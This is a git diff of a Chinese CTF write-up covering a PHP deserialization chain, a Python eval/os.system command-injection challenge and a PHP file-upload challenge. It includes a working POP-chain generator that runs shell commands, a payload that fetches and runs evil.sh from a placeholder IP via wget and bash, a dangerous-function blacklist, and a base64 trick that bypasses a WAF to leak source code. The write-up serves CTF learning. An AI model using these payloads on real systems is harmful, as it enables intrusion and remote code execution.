@@ -208,7 +208,7 @@ hackbar我用这个payload
 
 `cmd=O%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A4%3A%22what%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A3%3A%22mix%22%3A1%3A%7Bs%3A2%3A%22m1%22%3BO%3A4%3A%22crow%22%3A2%3A%7Bs%3A2%3A%22v1%22%3BO%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A3%3A%22mix%22%3A1%3A%7Bs%3A2%3A%22m1%22%3Bs%3A17%3A%22%0Asystem%28%27cat+*%27%29%3B%22%3B%7D%7Ds%3A2%3A%22v2%22%3BN%3B%7D%7D%7D%7D`
 
-仔细看可以看出一些细微的差别，system前面变成了%0D%0A，多了个%0D，%0D 是CR hackbar帮我补了回车，因此打不通，hackbar使用raw的方式是不会补回车的，也可以成功打通
+仔细看可以看出一些细微的差别，system前面变成了%0D%0A，多了个%0D，**%0D 是CR hackbar帮我补了回车，因此打不通，**hackbar使用raw的方式是不会补回车的，也可以成功打通
 
 #### 我的payload问题出在哪了?
 
@@ -218,16 +218,112 @@ hackbar我用这个payload
 
 遇到这种问题还是基本功不扎实，说实现我现在也还是不特别了解url编码的作用和底层原理，会再好好研究一下然后再写一篇文章的。
 
+以下是能打通的POC
+
+```php
+<?php
+
+class crow
+{
+    public $v1;
+    public $v2;
+
+//    public function __construct()
+//    {
+//        $this->v1 = new fin();
+//    }
+
+    function eval() {
+        echo new $this->v1($this->v2);
+    }
+
+    public function __invoke()
+    {
+        $this->v1->world();
+    }
+}
+
+class fin
+{
+    public $f1;
+//    public function __construct()
+//    {
+//        $this->f1 = new what();
+//    }
+
+    public function __destruct()
+    {
+        echo $this->f1 . '114514';
+    }
+
+    public function run()
+    {
+        ($this->f1)();
+    }
+
+    public function __call($a, $b)
+    {
+        echo $this->f1->get_flag();
+    }
+}
+
+class what
+{
+    public $a;
+
+//    public function __construct()
+//    {
+//        $this->a = new mix();
+//    }
+
+    public function __toString()
+    {
+        $this->a->run();
+        return 'hello';
+    }
+}
+class mix
+{
+    public $m1 ;
+
+//    public function __construct()
+//    {
+//        $this->m1 = new crow();
+//    }
+
+    public function run()
+    {
+        ($this->m1)();
+    }
+
+    public function get_flag()
+    {
+        eval('#' . $this->m1);
+    }
+}
+
+$cmd = new fin();
+$cmd-> f1 = new what();
+$cmd-> f1 -> a = new mix();
+$cmd-> f1 -> a -> m1 = new crow();
+$cmd-> f1 -> a -> m1 -> v1 = new fin();
+$cmd-> f1 -> a -> m1 -> v1 -> f1 = new mix();
+$cmd-> f1 -> a -> m1 -> v1 -> f1 ->m1 = '/n cat flag';
+echo urlencode(serialize($cmd));
+```
+
 
 #### \_\_destruct报错为什么不用管？
 
-__destruct报错不用管，因为这时候已经echo了内容然后才触发报错。
+mix的参数不能又是对象又可以当字符串进行字符串拼接，因此报错是必然的，但是__destruct报错不用管，因为这时候已经echo了内容然后才触发报错。
 
 ### calc
 
+题目的关键点是发现传入的num参数会先被eval执行然后又被os.system执行，想办法输入eval不报错但是可以在shell中运行的代码是解题的关键思路
+
 #### 解法一 
 
-来自0rays nazo师傅
+来自0rays nazo师傅的思路
 
 ```python
 log = "echo {0} {1} {2}> ./tmp/log.txt".format(time.strftime("%Y%m%d-
@@ -269,9 +365,84 @@ os.system的时候#注释后面内容 cat这个语句被执行
 
 #### 解法二 
 
-来自vidar summer师傅
+来自vidar summer师傅的思路
 
 num = "1+1#`wget\thttp://x.x.x.x:60056/evil.sh`"
 num = "1+1#`bash\tevil.sh`"
 
-这里#在python中确实会注释后面的内容，eval不会报错，但是在os.system里面由于#在双引号中，代码会被执行，#只会被当作一个字符，这点非常神奇，学习了两位师傅的解法后发现都用了#去绕过，但是具体的利用方式也不一样，非常巧妙，学到了很多。
+这里#在python中确实会注释后面的内容，eval不会报错因为反引号内容被注释了，但是在os.system里面由于#在双引号中，反引号里面的内容在shell里代码会被执行，#只会被当作一个字符，这点非常神奇，学习了两位师傅的解法后发现都用了#去绕过，但是具体的利用方式也不一样，非常巧妙，学到了很多。
+
+### upgdstore
+
+>
+>
+>参考:https://erroratao.github.io/writeup/DASCTF2022xSU/
+
+是个文件上传的题目但是没有给出源码，上传一个`<?php phpinfo();?>`内容的php文件，发现上传成功并且给出了访问路径
+
+![image-20220327134842381](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220327134842381.png)
+
+看一看phpinfo能不能拿到源码
+
+![image-20220327135926344](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220327135926344.png)
+
+看了看发现有很多很多disable_function，非常吓人，
+
+可以使用show_source读取index.php的源码，然后用base64编码绕过waf对此函数的过滤，所以我们传入`<?php base64_decode("c2hvd19zb3VyY2U=")('../index.php');?>`内容的文件，得到源码
+
+```php
+<div class="light"><span class="glow">
+<form enctype="multipart/form-data" method="post" onsubmit="return checkFile()">
+    嘿伙计，传个火？！
+    <input class="input_file" type="file" name="upload_file"/>
+    <input class="button" type="submit" name="submit" value="upload"/>
+</form>
+</span><span class="flare"></span><div>
+<?php
+function fun($var): bool{
+    $blacklist = ["\$_", "eval","copy" ,"assert","usort","include", "require", "$", "^", "~", "-", "%", "*","file","fopen","fwriter","fput","copy","curl","fread","fget","function_exists","dl","putenv","system","exec","shell_exec","passthru","proc_open","proc_close", "proc_get_status","checkdnsrr","getmxrr","getservbyname","getservbyport", "syslog","popen","show_source","highlight_file","`","chmod"];
+
+    foreach($blacklist as $blackword){
+        if(strstr($var, $blackword)) return True;
+    }
+
+    
+    return False;
+}
+error_reporting(0);
+//设置上传目录
+define("UPLOAD_PATH", "./uploads");
+$msg = "Upload Success!";
+if (isset($_POST['submit'])) {
+$temp_file = $_FILES['upload_file']['tmp_name'];
+$file_name = $_FILES['upload_file']['name'];
+$ext = pathinfo($file_name,PATHINFO_EXTENSION);
+if(!preg_match("/php/i", strtolower($ext))){
+die("只要好看的php");
+}
+
+$content = file_get_contents($temp_file);
+if(fun($content)){
+    die("诶，被我发现了吧");
+}
+$new_file_name = md5($file_name).".".$ext;
+        $img_path = UPLOAD_PATH . '/' . $new_file_name;
+
+
+        if (move_uploaded_file($temp_file, $img_path)){
+            $is_upload = true;
+        } else {
+            $msg = 'Upload Failed!';
+            die();
+        }
+        echo '<div style="color:#F00">'.$msg." Look here~ ".$img_path."</div>";
+}
+```
+
+我们可以用url编码一句话木马来连shell
+
+`<?php base64_decode("c2hvd19zb3VyY2U=")('../index.php');?>`
+
+但是直接连shell貌似不行，需要先bypass disable_functions
+
+看别的师傅的wp还没复现出来，卡住了
